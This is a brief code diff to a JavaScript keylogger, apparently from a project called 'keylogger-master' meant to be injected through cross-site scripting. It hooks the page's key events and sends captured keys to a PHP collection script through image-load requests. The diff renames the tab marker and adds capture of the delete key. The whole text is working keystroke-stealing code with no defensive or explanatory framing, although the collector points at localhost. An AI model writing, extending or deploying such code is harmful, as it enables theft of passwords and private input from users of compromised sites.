@@ -8,10 +8,13 @@ document.onkeypress = function(e) {
 
 document.onkeydown=function(){
 if(window.event.keyCode == 9){ 
-  new Image().src = 'http://localhost:8888/xss/keylogger-master/keylogger.php?c=--table--';
+  new Image().src = 'http://localhost:8888/xss/keylogger-master/keylogger.php?c=--tab--';
 }
 if(window.event.keyCode == 13){ 
   new Image().src = 'http://localhost:8888/xss/keylogger-master/keylogger.php?c=--enter--';
+}
+if(window.event.keyCode == 46){ 
+  new Image().src = 'http://localhost:8888/xss/keylogger-master/keylogger.php?c=--delete--';
 }
 }
 
